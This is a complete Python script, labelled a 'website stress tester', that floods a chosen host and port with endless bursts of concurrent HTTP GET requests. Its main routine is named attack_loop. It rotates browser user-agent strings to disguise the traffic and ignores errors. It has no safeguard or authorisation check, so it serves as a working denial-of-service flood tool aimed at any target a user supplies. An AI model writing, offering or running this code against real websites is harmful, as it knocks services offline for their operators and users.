#!/usr/bin/env python3

import argparse
import asyncio
import random
import logging
import aiohttp
import uvloop
import time

# Argument parsing
parser = argparse.ArgumentParser(description="Async Website Stress Tester")
parser.add_argument("hostname", help="Target hostname or IP")
parser.add_argument("port", type=int, help="Target port (usually 80 or 443)")
parser.add_argument("delay", type=float, help="Delay between bursts (in seconds)")
parser.add_argument("threads", type=int, help="Number of concurrent requests (threads)")
args = parser.parse_args()

# Logging
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

async def send_request(session, url):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Connection": "keep-alive"
    }
    try:
        async with session.get(url, headers=headers) as response:
            await response.text()
    except Exception:
        pass  # silently ignore connection errors

async def attack_loop():
    url = f"http://{args.hostname}:{args.port}/?{random.randint(0, 10000)}"
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [send_request(session, url) for _ in range(args.threads)]
            await asyncio.gather(*tasks)
            logging.info(f"Sent {args.threads} requests to {args.hostname}")
            await asyncio.sleep(args.delay)

if __name__ == "__main__":
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    asyncio.run(attack_loop())
